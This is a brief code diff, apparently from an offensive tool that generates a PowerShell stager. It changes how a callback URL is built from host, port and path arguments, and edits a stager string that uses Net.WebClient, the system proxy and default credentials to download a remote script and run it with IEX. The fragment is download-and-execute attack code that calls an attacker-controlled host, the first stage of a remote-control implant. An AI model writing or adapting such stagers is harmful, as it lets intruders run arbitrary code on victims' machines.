@@ -111,7 +111,7 @@ callback_url = '%s://%s:%d/%s' % (
     args.PROTOCOL,
     args.URI_HOST,
     args.URI_PORT,
-    args.URI_PATH,
+    args.URI_PATH+'/' if args.URI_PATH else '',
 )
 
 
@@ -120,5 +120,5 @@ stager_str = (
     "$K=new-object net.webclient;"
     "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
     "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
-    "IEX $K.downloadstring('%s');"
+    "IEX $K.downloadstring('%s0');"
 ) % callback_url
